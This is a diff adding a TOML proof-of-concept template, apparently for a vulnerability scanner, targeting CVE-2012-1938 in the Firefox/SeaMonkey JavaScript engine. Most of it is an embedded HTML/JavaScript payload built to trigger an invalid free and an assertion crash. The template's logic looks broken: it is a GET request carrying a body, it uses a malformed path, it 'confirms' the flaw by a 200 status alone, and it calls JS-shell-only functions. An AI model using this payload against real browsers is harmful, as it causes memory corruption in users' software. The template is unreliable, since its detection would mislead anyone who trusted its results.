@@ -1,0 +1,63 @@
+[info]
+author = "AVE"
+description = "通过特制 HTML 页面触发 Mozilla Firefox/Thunderbird/SeaMonkey 浏览器引擎中 JSObject::makeDenseArraySlow 的无效释放及 js_SuppressDeletedProperty 断言崩溃，验证内存破坏漏洞存在"
+id = "POC-AVE-2012-0197"
+name = "CVE-2012-1938 PoC"
+severity = "critical"
+tags = [
+    "cve-2012-1938",
+    "memory-corruption",
+    "browser-engine",
+]
+vuln_id = [
+    "CVE-2012-1938",
+    "AVE-2012-0197",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2012-1938-poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html><body><script>
+// Bug 730415: Invalid free in JSObject::makeDenseArraySlow
+try {
+  var arr = [1,2,3,4,5,6,7,8,9,10];
+  for (var i = 0; i < 1000; i++) {
+    arr[i] = i;
+    if (i > 500) {
+      try { arr.__proto__ = {}; } catch(e) {}
+    }
+  }
+} catch(e) {}
+// Bug 736012: Assertion failure in js_SuppressDeletedProperty
+var lfcode = new Array();
+lfcode.push("function fatty() { try { fatty(); } catch (e) { for each (foo in [1]) {} } } fatty();");
+lfcode.push("gc()");
+lfcode.push("");
+while (true) {
+  var file = lfcode.shift();
+  if (file == undefined) { break; }
+  try { evaluate(file); } catch(e) { break; }
+}
+</script></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "memory corruption",
+    "crash",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
